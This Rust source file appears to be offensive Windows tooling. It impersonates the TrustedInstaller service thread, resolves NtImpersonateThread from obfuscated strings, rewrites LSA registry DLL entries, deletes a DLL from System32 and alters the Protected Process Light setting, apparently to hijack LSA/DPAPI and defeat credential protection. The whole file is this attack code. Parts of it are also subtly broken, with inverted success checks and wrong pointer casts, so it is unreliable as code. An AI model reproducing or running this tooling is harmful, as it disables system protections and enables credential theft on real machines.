use std::ffi::{CStr};
use crate::types::*;
use export_resolver::ExportList;
use obfstr::obfstr;
use std::mem::transmute;
use std::process::exit;
use std::ptr::null_mut;
use winapi::shared::minwindef::{BYTE, DWORD, HKEY};

pub fn win32api_err_print(function_name: &str, api_name: &str) {
    use std::io;

    let os_error = io::Error::last_os_error();

    #[cfg(feature = "print")]
    eprintln!(
        "[!] {} {} failed With Error: {}",
        function_name, api_name, os_error
    );
}
pub fn enable_privilege(sz_privilege_name: &str) -> bool {
    use std::ptr::null_mut;

    use winapi::shared::ntdef::{FALSE, HANDLE, LUID};
    use winapi::um::handleapi::CloseHandle;
    use winapi::um::processthreadsapi::{GetCurrentProcess, OpenProcessToken};
    use winapi::um::securitybaseapi::AdjustTokenPrivileges;
    use winapi::um::winbase::LookupPrivilegeValueW;
    use winapi::um::winnt::{
        PTOKEN_PRIVILEGES, SE_PRIVILEGE_ENABLED, TOKEN_ADJUST_PRIVILEGES, TOKEN_PRIVILEGES,
    };

    let previous_state: PTOKEN_PRIVILEGES = null_mut();
    let mut l_uid: LUID = unsafe { std::mem::zeroed() };
    let mut h_token: HANDLE = unsafe { std::mem::zeroed() };
    let mut token_privileges: TOKEN_PRIVILEGES = unsafe { std::mem::zeroed() };

    unsafe {
        if LookupPrivilegeValueW(
            null_mut(),
            sz_privilege_name.as_ptr() as *const u16,
            &mut l_uid,
        ) == 0
        {
            win32api_err_print("enable_privilege", "LookupPrivilegeValueW");
            return false;
        }

        let current_process_handle = GetCurrentProcess();
        if OpenProcessToken(
            current_process_handle,
            TOKEN_ADJUST_PRIVILEGES,
            &mut h_token,
        ) == 0
        {
            win32api_err_print("enable_privilege", "OpenProcessToken");
            return false;
        }

        token_privileges.PrivilegeCount = 0x01;
        token_privileges.Privileges[0].Luid = l_uid;
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        let res = AdjustTokenPrivileges(
            h_token,
            FALSE.into(),
            &mut token_privileges,
            size_of::<TOKEN_PRIVILEGES> as *const () as u32,
            null_mut(),
            null_mut(),
        );

        win32api_err_print("enable_privilege", "AdjustTokenPrivileges");

        CloseHandle(h_token);
        true
    }
}

pub(crate) struct ApiResolver {
    exports: ExportList<'static>,
}

impl ApiResolver {
    pub(crate) fn new() -> Self {
        ApiResolver {
            exports: ExportList::new(),
        }
    }

    // 获取对 NTDLL/KERNEL32 导出的引用
    pub(crate) fn get_addr(&mut self, dll: &'static str, func: &'static str) -> usize {
        self.exports
            .add(dll, func)
            .unwrap_or_else(|_| panic!("{}{}{}", obfstr!(" Couldn't add "), dll, func));

        // 获取函数的虚拟地址
        let addr = self
            .exports
            .get_function_address(func)
            .unwrap_or_else(|_| panic!("{}{}{}", obfstr!(" No adress for "), dll, func));

        addr
    }
}

pub fn impersonate_trusted_installer() {
    use std::ptr::null_mut;
    use std::thread;
    use std::time::Duration;

    use winapi::um::handleapi::CloseHandle;
    use winapi::um::handleapi::INVALID_HANDLE_VALUE;
    use winapi::um::processthreadsapi::{GetCurrentThread, OpenThread};
    use winapi::um::tlhelp32::{
        CreateToolhelp32Snapshot, TH32CS_SNAPTHREAD, THREADENTRY32, Thread32First, Thread32Next,
    };
    use winapi::um::winnt::{
        LPCWSTR, SECURITY_QUALITY_OF_SERVICE, SECURITY_STATIC_TRACKING, SecurityImpersonation,
        THREAD_DIRECT_IMPERSONATION, THREAD_QUERY_INFORMATION,
    };
    use winapi::um::winsvc::{
        CloseServiceHandle, OpenSCManagerW, OpenServiceW, QueryServiceStatusEx, SC_MANAGER_CONNECT,
        SC_STATUS_PROCESS_INFO, SERVICE_QUERY_STATUS, SERVICE_RUNNING, SERVICE_START,
        SERVICE_STATUS_PROCESS, StartServiceW,
    };

    let mut dw_trusted_inst_tid = 0x00;
    let mut thread_entry32: THREADENTRY32 = unsafe { std::mem::zeroed() };
    let mut ssp: SERVICE_STATUS_PROCESS = unsafe { std::mem::zeroed() };
    let mut dw_bytes_needed = 0x00;

    unsafe {
        let h_scm = OpenSCManagerW(null_mut(), null_mut(), SC_MANAGER_CONNECT);
        if h_scm == null_mut() {
            win32api_err_print("impersonate_trusted_installer", "OpenSCManagerW");
            CloseServiceHandle(h_scm);
            exit(1);
        }

        let h_svc = OpenServiceW(
            h_scm,
            "TrustedInstaller".as_ptr() as LPCWSTR,
            SERVICE_QUERY_STATUS | SERVICE_START,
        );
        if h_svc == null_mut() {
            win32api_err_print("impersonate_trusted_installer", "OpenServiceW");
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }

        if QueryServiceStatusEx(
            h_svc,
            SC_STATUS_PROCESS_INFO,
            &mut ssp as *mut _ as *mut u8,
            size_of::<SERVICE_STATUS_PROCESS> as *const () as u32,
            &mut dw_bytes_needed,
        ) == 0
        {
            win32api_err_print("impersonate_trusted_installer", "QueryServiceStatusEx1");
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }

        if ssp.dwCurrentState != SERVICE_RUNNING {
            #[cfg(feature = "print")]
            println!(
                "[*] TrustedInstaller State {}, Starting Service...",
                ssp.dwCurrentState
            );

            if StartServiceW(h_svc, 0x00, null_mut()) == 0 {
                #[cfg(feature = "print")]
                println!("[!] StartService Failed");
                win32api_err_print("impersonate_trusted_installer", "StartServiceW");
                CloseServiceHandle(h_scm);
                CloseServiceHandle(h_svc);
                exit(1);
            }
        }

        loop {
            thread::sleep(Duration::from_millis(200));

            if QueryServiceStatusEx(
                h_svc,
                SC_STATUS_PROCESS_INFO,
                &mut ssp as *mut _ as *mut u8,
                size_of::<SERVICE_STATUS_PROCESS> as *const () as u32,
                &mut dw_bytes_needed,
            ) == 0
            {
                win32api_err_print("impersonate_trusted_installer", "QueryServiceStatusEx2");
                CloseServiceHandle(h_scm);
                CloseServiceHandle(h_svc);
                exit(1);
            }

            if ssp.dwCurrentState == SERVICE_RUNNING {
                break;
            }
        }

        if ssp.dwProcessId == 0x00 {
            #[cfg(feature = "print")]
            println!("[!] Could Not Resolve TrustedInstaller's PID");
        }

        #[cfg(feature = "print")]
        println!("[+] TrustedInstaller PID: {}", ssp.dwProcessId);

        let h_snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0x00);
        if h_snap == INVALID_HANDLE_VALUE {
            win32api_err_print("impersonate_trusted_installer", "CreateToolhelp32Snapshot");
            CloseHandle(h_snap);
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }

        let b_ok = Thread32First(h_snap, &mut thread_entry32);
        if b_ok == 0 {
            win32api_err_print("impersonate_trusted_installer", "Thread32First");
            CloseHandle(h_snap);
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }

        loop {
            if thread_entry32.th32OwnerProcessID == ssp.dwProcessId {
                dw_trusted_inst_tid = thread_entry32.th32ThreadID;
                break;
            }

            let b_ok = Thread32Next(h_snap, &mut thread_entry32);
            if b_ok == 0 {
                win32api_err_print("impersonate_trusted_installer", "Thread32Next");
                break;
            }
        }

        if dw_trusted_inst_tid == 0x00 {
            #[cfg(feature = "print")]
            println!("[!] Could Not Resolve TrustedInstaller's TID");
        }

        #[cfg(feature = "print")]
        println!("[+] Found TrustedInstaller Thread: {}", dw_trusted_inst_tid);

        let h_trusted_inst_thread = OpenThread(
            THREAD_DIRECT_IMPERSONATION | THREAD_QUERY_INFORMATION,
            0,
            dw_trusted_inst_tid,
        );
        if h_trusted_inst_thread == null_mut() {
            win32api_err_print("impersonate_trusted_installer", "OpenThread");
            CloseHandle(h_trusted_inst_thread);
            CloseHandle(h_snap);
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }

        #[cfg(feature = "print")]
        println!("[+] Opened TrustedInstaller Thread Handle");

        use winapi::shared::minwindef::DWORD;

        let mut service_quality = SECURITY_QUALITY_OF_SERVICE {
            Length: size_of::<SECURITY_QUALITY_OF_SERVICE>() as DWORD,
            ImpersonationLevel: SecurityImpersonation,
            ContextTrackingMode: SECURITY_STATIC_TRACKING,
            EffectiveOnly: 0,
        };

        let mut api = ApiResolver::new();
        let nt_impersonate_thread = api.get_addr(&NTDLL_DLL, &NTIMTH);
        let nt_impersonate_thread: NtImpersonateThreadFn = transmute(nt_impersonate_thread);

        if nt_impersonate_thread(
            GetCurrentThread(),
            h_trusted_inst_thread,
            &mut service_quality,
        ) != 0x00
        {
            win32api_err_print("impersonate_trusted_installer", "p_nt_impersonate_thread");
            CloseHandle(h_trusted_inst_thread);
            CloseHandle(h_snap);
            CloseServiceHandle(h_scm);
            CloseServiceHandle(h_svc);
            exit(1);
        }
    }
}

pub fn u8_to_string(sz_dll_name: &[u8]) -> String {
    let c_str = match CStr::from_bytes_until_nul(sz_dll_name) {
        Ok(s) => s,
        Err(e) => {
            #[cfg(feature = "print")]
            eprintln!("Error: Array does not contain a null terminator or contains internal null bytes: {}", e);

            let full_slice = &sz_dll_name[..];
            match std::str::from_utf8(full_slice) {
                Ok(s) => {
                    #[cfg(feature = "print")]
                    // 打印整个切片，注意它可能包含非打印字符或垃圾数据
                    println!("Printing full array slice as str (may contain garbage): {}", s);
                }
                Err(_) => {
                    #[cfg(feature = "print")]
                    println!("Full array slice is not valid UTF-8.");
                }
            }
            exit(1);
        }
    };

    match c_str.to_str() {
        Ok(rust_str) => {
            rust_str.parse().unwrap()
        }
        Err(e) => {
            #[cfg(feature = "print")]
            eprintln!("⚠️ Conversion to &str failed (Invalid UTF-8): {}", e);
            exit(1);
        }
    }
}

pub fn query_lsa_reg_key(sz_reg_path: &str, sz_value_name: &str) -> String {
    use winapi::shared::minwindef::{DWORD, HKEY, BYTE, LPBYTE};
    use winapi::um::minwinbase::LPTR;
    use winapi::um::winbase::LocalAlloc;
    use winapi::um::winnt::{KEY_QUERY_VALUE, LPCWSTR};
    use winapi::um::winreg::{HKEY_LOCAL_MACHINE, RegCloseKey, RegOpenKeyExW, RegQueryValueExW};

    let mut h_key: HKEY = unsafe { std::mem::zeroed() };
    let mut dw_dll_name_len: DWORD = 0;
    let mut sz_dll_name: [BYTE; 256] = unsafe { std::mem::zeroed() };

    unsafe {
        if RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sz_reg_path.as_ptr() as LPCWSTR,
            0,
            KEY_QUERY_VALUE,
            &mut h_key,
        ) != 0
        {
            win32api_err_print("query_lsa_reg_key", "RegOpenKeyExW");
            RegCloseKey(h_key);
            exit(1);
        }

        #[cfg(feature = "print")]
        println!("[+] Successfully opened: {}", sz_reg_path);

        if RegQueryValueExW(
            h_key,
            sz_value_name.as_ptr() as LPCWSTR,
            null_mut(),
            null_mut(),
            null_mut(),
            &mut dw_dll_name_len,
        ) != 0
        {
            win32api_err_print("query_lsa_reg_key", "RegQueryValueExW_1");
            RegCloseKey(h_key);
            exit(1);
        }

        let sz_dll_name_1 = LocalAlloc(LPTR, dw_dll_name_len as usize);
        if sz_dll_name_1 != null_mut() {
            win32api_err_print("query_lsa_reg_key", "LocalAlloc");
            exit(1);
        }

        if RegQueryValueExW(
            h_key,
            sz_value_name.as_ptr() as LPCWSTR,
            null_mut(),
            null_mut(),
            &mut sz_dll_name as LPBYTE,
            &mut dw_dll_name_len,
        ) != 0
        {
            win32api_err_print("query_lsa_reg_key", "RegQueryValueExW_2");
            RegCloseKey(h_key);
            exit(1);
        }

        u8_to_string(&sz_dll_name)
    }
}

pub fn delete_dll_from_system32(sz_dll_name: &str) {
    use winapi::um::fileapi::DeleteFileW;
    use winapi::um::winnt::LPCWSTR;

    let dll_path = "C:\\Windows\\System32\\".to_string() + sz_dll_name;

    unsafe {
        let res = DeleteFileW(dll_path.as_ptr() as LPCWSTR);
        if res == 0 {
            win32api_err_print("delete_dll_from_system32","DeleteFileW");
            #[cfg(feature = "print")]
            println!("[!] Cant Delete The Original DLL: dpapisrv.dll");
            exit(1);
        }
    }

    #[cfg(feature = "print")]
    println!("[*] Deleted {}", sz_dll_name);

}

pub fn edit_protected_process_light(sz_reg_path: &str, sz_value_name: &str) {
    use winapi::um::winreg::{RegOpenKeyExW, HKEY_LOCAL_MACHINE, RegCloseKey, RegSetValueExW, RegFlushKey};
    use winapi::um::winnt::{LPCWSTR, KEY_SET_VALUE, REG_DWORD};
    use winapi::shared::minwindef::{BYTE, DWORD, HKEY};

    let mut h_key: HKEY = unsafe { std::mem::zeroed() };
    let mut dw_new_value: [BYTE; 256] = unsafe { std::mem::zeroed() };

    unsafe {
        let res = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE,
            sz_reg_path.as_ptr() as LPCWSTR,
            0,
            KEY_SET_VALUE,
            &mut h_key,
        );
        if res == 0 {
            win32api_err_print("edit_protected_process_light", "RegOpenKeyExW");
            RegCloseKey(h_key);
            exit(1);
        }

        #[cfg(feature = "print")]
        println!("[*] Successfully opened {}", sz_reg_path);

        let res = RegSetValueExW(
            h_key,
            sz_value_name.as_ptr() as LPCWSTR,
            0,
            REG_DWORD,
            &mut dw_new_value as *const BYTE,
            size_of::<DWORD> as *const () as u32,
        );
        if res == 0 {
            win32api_err_print("edit_protected_process_light", "RegSetValueExW");
            RegCloseKey(h_key);
            exit(1);
        }

        #[cfg(feature = "print")]
        println!("[*] Successfully Set {} to {}", sz_value_name, u8_to_string(&dw_new_value));

        RegFlushKey(h_key);
    }
}

pub fn edit_lsa_reg_key(sz_reg_path: &str, sz_value_name: &str) {
    use winapi::um::winreg::{RegOpenKeyExW, RegSetValueExW, HKEY_LOCAL_MACHINE, RegCloseKey, RegFlushKey};
    use winapi::um::winnt::{LPCWSTR, KEY_SET_VALUE, REG_SZ};

    let mut h_key: HKEY = unsafe { std::mem::zeroed() };
    let mut sz_new_dll_name: [BYTE; 256] = unsafe { std::mem::zeroed() };

    unsafe {
        let res =
            RegOpenKeyExW(
                HKEY_LOCAL_MACHINE,
                sz_reg_path.as_ptr() as LPCWSTR,
                0,
                KEY_SET_VALUE,
                &mut h_key
            );
        if res == 0 {
            win32api_err_print("edit_lsa_reg_key", "RegOpenKeyExW");
            RegCloseKey(h_key);
            exit(1);
        }

        let len_without_null: usize = sz_new_dll_name
            .iter()
            .position(|&c| c == 0)
            .unwrap_or_else(|| sz_new_dll_name.len());

        let total_chars_count: usize = len_without_null + 1;

        let cb_data: usize = total_chars_count * size_of::<u16>();

        let res = RegSetValueExW(
            h_key,
            sz_value_name.as_ptr() as LPCWSTR,
            0,
            REG_SZ,
            &mut sz_new_dll_name as *const BYTE,
            cb_data as DWORD
        );
        if res == 0 {
            win32api_err_print("edit_lsa_reg_key", "RegSetValueExW");
            RegCloseKey(h_key);
            exit(1);
        }

        RegFlushKey(h_key);
    };
}